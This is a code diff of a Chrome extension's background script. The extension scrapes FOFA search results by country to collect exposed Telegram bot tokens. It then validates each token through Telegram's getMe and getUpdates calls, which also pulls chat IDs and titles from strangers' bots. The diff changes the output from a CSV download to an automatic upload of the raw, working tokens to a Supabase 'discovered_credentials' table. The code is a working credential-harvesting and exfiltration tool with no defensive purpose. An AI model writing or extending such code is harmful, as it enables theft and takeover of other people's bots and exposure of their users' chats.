@@ -18,11 +18,11 @@ let state = {
     countryIndex: 0,
     countriesDone: 0,
     resultsFound: 0,
-    results: [],     // Array of {token, chat_id}
-    seenTokens: new Set() // For dedup
+    resultsValid: 0,
+    results: [],
+    seenTokens: new Set()
 };
 
-// Restore state on startup
 loadState();
 
 let activeTabId = null;
@@ -31,9 +31,8 @@ let activeTabId = null;
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     switch (msg.action) {
         case "GET_STATE":
-            // This is the only case that needs a response
             sendResponse(serializeState(state));
-            return false; // Synchronous response already sent
+            return false;
         case "START_SCAN":
             startScan(msg.query, msg.domain);
             break;
@@ -43,11 +42,9 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
         case "RESUME_SCAN":
             resumeScan();
             break;
-        case "DOWNLOAD_RESULTS":
-            downloadResults();
+        case "UPLOAD_RESULTS":
+            uploadToSupabase();
             break;
-
-        // Messages from Content Script
         case "CAPTCHA_DETECTED":
             pauseScan("⚠️ Captcha Detected!");
             break;
@@ -61,59 +58,39 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
             console.log("[Content]", msg.message);
             break;
     }
-    return false; // No async response needed for other cases
+    return false;
 });
 
-// --- PERSISTENCE HELPERS ---
+// --- PERSISTENCE ---
 
 function saveState() {
-    // Convert Set to Array for storage
-    const storageState = {
-        ...state,
-        seenTokens: Array.from(state.seenTokens)
-    };
-    chrome.storage.local.set({ 'scraper_state': storageState });
+    const storageState = { ...state, seenTokens: Array.from(state.seenTokens) };
+    chrome.storage.local.set({ scraper_state: storageState });
 }
 
 function loadState() {
-    chrome.storage.local.get(['scraper_state'], (result) => {
+    chrome.storage.local.get(["scraper_state"], (result) => {
         if (result.scraper_state) {
             const loaded = result.scraper_state;
-
-            // Restore Set
-            if (loaded.seenTokens) {
-                loaded.seenTokens = new Set(loaded.seenTokens);
-            } else {
-                loaded.seenTokens = new Set();
-            }
-
-            // If we loaded a state that was "Running", we should probably set it to "Stopped" or "Paused" 
-            // because the service worker died, so the loop is broken.
+            loaded.seenTokens = loaded.seenTokens ? new Set(loaded.seenTokens) : new Set();
             if (loaded.isRunning && !loaded.isPaused) {
                 loaded.isRunning = false;
                 loaded.status = "Stopped (Recovered)";
             }
-
             state = loaded;
-            console.log("State restored:", state);
         }
     });
 }
 
 function serializeState(s) {
-    // Prepare for message passing (Sets might not serialize well depending on Chrome ver, safe to keep as is usually, 
-    // but cleaner to standard JSON types if Popup expects it)
     return s;
 }
-
 
 // --- CORE LOGIC ---
 
 async function startScan(userQuery, userDomain) {
-    // If we are already running, do nothing
     if (state.isRunning) return;
 
-    // Reset State (FRESH START) -> Save immediately
     state.isRunning = true;
     state.isPaused = false;
     state.status = "Starting...";
@@ -122,61 +99,55 @@ async function startScan(userQuery, userDomain) {
     state.countryIndex = 0;
     state.countriesDone = 0;
     state.resultsFound = 0;
+    state.resultsValid = 0;
     state.results = [];
     state.seenTokens = new Set();
-
-    // Randomize Country Order
     state.countryList = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
 
-    saveState(); // PERSIST
+    saveState();
 
-    // Get Active Tab
     const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-    if (!tab) {
-        stopScan("No active tab found");
-        return;
-    }
+    if (!tab) { stopScan("No active tab found"); return; }
     activeTabId = tab.id;
+
+    // Watchdog: fires every 2 minutes to unstick a stalled scan
+    chrome.alarms.create("watchdog", { periodInMinutes: 2 });
 
     broadcastState();
     processNextCountry();
 }
 
-// ... stopScan, pauseScan, resumeScan, nextCountry ...
-
 function stopScan(reason) {
     state.isRunning = false;
     state.isPaused = false;
     state.status = reason || "Stopped";
-    saveState(); // PERSIST
+    chrome.alarms.clearAll();
+    // Tell the content script to abort immediately
+    if (activeTabId) {
+        chrome.tabs.sendMessage(activeTabId, { action: "STOP_WORK" }).catch(() => {});
+    }
+    saveState();
     broadcastState();
 }
 
 function pauseScan(reason) {
     state.isPaused = true;
     state.status = reason || "Paused";
-    saveState(); // PERSIST
+    saveState();
     broadcastState();
 }
 
 function resumeScan() {
-    if (!state.isRunning && state.status !== "Stopped (Recovered)") return; // Only resume if running OR we just recovered
-
-    // If we are recovering from a crash/reload
-    if (!state.isRunning) {
-        state.isRunning = true;
-    }
-
+    if (!state.isRunning && state.status !== "Stopped (Recovered)") return;
+    if (!state.isRunning) state.isRunning = true;
     state.isPaused = false;
     state.status = "Resuming...";
-    saveState(); // PERSIST
+    saveState();
     broadcastState();
 
-    // We need to re-acquire the active tab if we crashed
     chrome.tabs.query({ active: true, currentWindow: true }).then(([tab]) => {
         if (tab) {
             activeTabId = tab.id;
-            // Try to resume logic
             chrome.tabs.sendMessage(activeTabId, { action: "RESUME_WORK" }).catch(() => {
                 processNextCountry(false);
             });
@@ -189,63 +160,78 @@ function resumeScan() {
 function nextCountry() {
     state.countryIndex++;
     state.countriesDone++;
-    saveState(); // PERSIST
+    saveState();
     processNextCountry();
 }
 
 async function processNextCountry(increment = true) {
-    if (!state.isRunning) return;
-    if (state.isPaused) return;
+    if (!state.isRunning || state.isPaused) return;
 
-    // Use randomized list or fallback
     const currentList = state.countryList || COUNTRY_CODES;
 
     if (state.countryIndex >= currentList.length) {
         stopScan("✅ Scan Complete!");
-        downloadResults();
+        await uploadToSupabase();
         return;
     }
 
     const country = currentList[state.countryIndex];
     state.status = `Navigating: ${country} (${state.domain})`;
-    saveState(); // PERSIST & Update Status
+    saveState();
     broadcastState();
 
     const fullQuery = `${state.query} && country="${country}"`;
     const encoded = btoa(fullQuery);
     const targetUrl = `https://${state.domain}/result?qbase64=${encoded}`;
 
-    // Navigate
     await chrome.tabs.update(activeTabId, { url: targetUrl });
-
-    // Wait for load (listener onUpdated is hard to sync perfectly in pure simpler logic)
-    // We can use a simple timeout loop or chrome.tabs.onUpdated
 }
 
-// Global Nav Listener
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (tabId === activeTabId && changeInfo.status === 'complete' && state.isRunning && !state.isPaused) {
-        // Page loaded!
-        // Inject / Trigger Content Script
-        setTimeout(() => {
-            chrome.tabs.sendMessage(tabId, { action: "SCRAPE_PAGE" }).catch(err => {
-                console.log("Injection failed or content script missing", err);
-                // Maybe inject? Manifest V3 content scripts auto-inject on match.
-                // If error, maybe we are not on fofa?
-            });
-        }, 2000); // Wait bit for Vue app to hydrate
+    if (tabId === activeTabId && changeInfo.status === "complete" && state.isRunning && !state.isPaused) {
+        // Use chrome.alarms to schedule the scrape message — alarms wake the service worker
+        // reliably even if it went to sleep during the 2s wait.
+        chrome.alarms.create("scrape_page", { delayInMinutes: 0.05 }); // ~3 seconds
     }
 });
 
+// Alarm handler — wakes the service worker and sends the scrape message
+chrome.alarms.onAlarm.addListener((alarm) => {
+    if (alarm.name === "scrape_page") {
+        if (!state.isRunning || state.isPaused || !activeTabId) return;
+        chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch((err) => {
+            console.log("SCRAPE_PAGE send failed:", err);
+            // Tab may have navigated away or content script not ready — move on
+            nextCountry();
+        });
+    }
 
-// --- VALIDATION LOGIC ---
+    if (alarm.name === "watchdog") {
+        // If scan is running but appears stuck (no country progress), nudge it
+        if (state.isRunning && !state.isPaused && activeTabId) {
+            chrome.tabs.get(activeTabId, (tab) => {
+                if (chrome.runtime.lastError || !tab) {
+                    stopScan("Tab closed — scan stopped");
+                    return;
+                }
+                // Tab exists — if it's done loading and we haven't moved, re-trigger
+                if (tab.status === "complete") {
+                    chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch(() => {
+                        nextCountry();
+                    });
+                }
+            });
+        }
+    }
+});
+
+// --- VALIDATION ---
 
 async function validateToken(data) {
     const token = data.token;
     const baseUrl = `https://api.telegram.org/bot${token}`;
 
     try {
-        // 1. Check getMe
         const meRes = await fetch(`${baseUrl}/getMe`);
         const meJson = await meRes.json();
 
@@ -259,12 +245,10 @@ async function validateToken(data) {
         data.bot_name = meJson.result.username;
         data.bot_id = meJson.result.id;
 
-        // 2. Try to get chat_id if missing
         if (!data.chatId) {
             try {
                 const upRes = await fetch(`${baseUrl}/getUpdates?limit=5`);
                 const upJson = await upRes.json();
-
                 if (upJson.ok && upJson.result) {
                     for (const update of upJson.result) {
                         const message = update.message || update.channel_post || update.my_chat_member;
@@ -272,18 +256,15 @@ async function validateToken(data) {
                             data.chatId = message.chat.id;
                             data.chatType = message.chat.type;
                             data.chatTitle = message.chat.title || message.chat.username;
-                            break; // Found one
+                            break;
                         }
                     }
                 }
-            } catch (ignore) {
-                // getUpdates might fail or timeout, ignore
-            }
+            } catch (_) {}
         }
 
         return data;
-
-    } catch (err) {
+    } catch (_) {
         data.valid = false;
         data.status = "Network/Error";
         return data;
@@ -291,53 +272,134 @@ async function validateToken(data) {
 }
 
 async function handleResult(data) {
-    if (!state.isRunning && state.status !== "Paused") return; // Ignore results if stopped
+    if (!state.isRunning && state.status !== "Paused") return;
     if (state.seenTokens.has(data.token)) return;
     state.seenTokens.add(data.token);
 
-    // Initial add (Optimistic UI?) 
-    // Or wait for validation? 
-    // Let's validate first for "rich" data, usually fast enough.
-    // Or add then update. Add then update is better for UI responsiveness but harder for simple state array.
-    // Given low volume, await is fine.
-
     const validatedData = await validateToken(data);
-
-    // LOG FOR USER VISIBILITY
     console.log("🦅 FOUND CREDENTIAL:", validatedData);
 
     state.results.push(validatedData);
     state.resultsFound++;
-    if (validatedData.valid) {
-        state.resultsValid++;
-    }
+    if (validatedData.valid) state.resultsValid++;
 
-    saveState(); // PERSIST!
+    saveState();
     broadcastState();
 }
 
 function broadcastState() {
-    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: state }).catch(() => { });
+    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: state }).catch(() => {});
 }
 
-function downloadResults() {
-    // Generate CSV Blob
-    let csvContent = "token,chat_id\n";
-    state.results.forEach(row => {
-        csvContent += `${row.token},${row.chatId || ""}\n`;
+// --- SUPABASE DIRECT UPLOAD ---
+// Credentials are stored in chrome.storage.sync (syncs across Chrome profiles).
+// The worker reads raw tokens from Supabase and encrypts them server-side.
+
+function sha256hex(str) {
+    // Encode string to Uint8Array, hash with SubtleCrypto, return hex string
+    const encoder = new TextEncoder();
+    return crypto.subtle.digest("SHA-256", encoder.encode(str)).then((buf) => {
+        return Array.from(new Uint8Array(buf))
+            .map((b) => b.toString(16).padStart(2, "0"))
+            .join("");
+    });
+}
+
+async function uploadToSupabase() {
+    const validResults = (state.results || []).filter((r) => r.valid === true);
+    if (validResults.length === 0) {
+        state.status = "⚠️ Nothing to upload (no valid tokens)";
+        saveState();
+        broadcastState();
+        return;
+    }
+
+    const cfg = await new Promise((resolve) => {
+        // Config syncs across Chrome profiles via chrome.storage.sync
+        chrome.storage.sync.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
     });
 
-    // In background script, we can use Data URI download
-    const date = new Date().toISOString().slice(0, 19).replace(/:/g, "-");
-    const filename = `fofa_scraper_${date}.csv`;
+    const supabaseUrl    = (cfg.supabaseUrl || "").trim().replace(/\/+$/, "");
+    const supabaseKey    = (cfg.supabaseKey || "").trim();
+    const extensionSecret = (cfg.extensionSecret || "").trim();
 
-    // Create a data URL
-    const base64 = btoa(unescape(encodeURIComponent(csvContent)));
-    const url = 'data:text/csv;base64,' + base64;
+    if (!supabaseUrl || !supabaseKey || !extensionSecret) {
+        state.status = "⚠️ Upload skipped — set Supabase URL, Key, and Write Secret in settings";
+        saveState();
+        broadcastState();
+        return;
+    }
 
-    chrome.downloads.download({
-        url: url,
-        filename: filename,
-        saveAs: true
-    });
+    state.status = `⬆️ Uploading ${validResults.length} tokens to Supabase...`;
+    saveState();
+    broadcastState();
+
+    const endpoint = `${supabaseUrl}/rest/v1/discovered_credentials`;
+    const headers = {
+        "Content-Type": "application/json",
+        "apikey": supabaseKey,
+        "Authorization": `Bearer ${supabaseKey}`,
+        // Secret checked by RLS policy — without this, the insert is rejected at DB level
+        "x-extension-secret": extensionSecret,
+        "Prefer": "resolution=merge-duplicates,return=representation"
+    };
+
+    let inserted = 0;
+    let skipped = 0;
+
+    for (const r of validResults) {
+        const token = (r.token || "").trim();
+        if (!token || !token.includes(":")) { skipped++; continue; }
+
+        const tokenHash = await sha256hex(token);
+
+        const row = {
+            // Raw token — the backend worker detects non-Fernet values and
+            // self-heals by encrypting in place before processing (see flow_tasks.py).
+            bot_token: token,
+            token_hash: tokenHash,
+            source: "extension_fofa",
+            status: r.chatId ? "active" : "pending",
+            bot_id: r.bot_id ? String(r.bot_id) : null,
+            bot_username: r.bot_name || r.botUsername || null,
+            chat_id: r.chatId || null,
+            chat_name: r.chatTitle || null,
+            chat_type: r.chatType || null,
+            meta: {
+                ingested_via: "extension",
+                domain: state.domain,
+                query: state.query,
+                valid: r.valid
+            }
+        };
+
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 10000);
+
+            const res = await fetch(endpoint, {
+                method: "POST",
+                headers,
+                body: JSON.stringify(row),
+                signal: controller.signal
+            });
+            clearTimeout(timeout);
+
+            if (res.ok || res.status === 409) {
+                // 409 = conflict on token_hash unique constraint (already exists) — not an error
+                inserted++;
+            } else {
+                const text = await res.text().catch(() => "");
+                console.warn(`Upload failed for token ${token.slice(0, 10)}...: ${res.status} ${text}`);
+                skipped++;
+            }
+        } catch (e) {
+            console.warn("Upload exception:", e);
+            skipped++;
+        }
+    }
+
+    state.status = `✅ Uploaded: ${inserted} tokens (${skipped} skipped)`;
+    saveState();
+    broadcastState();
 }
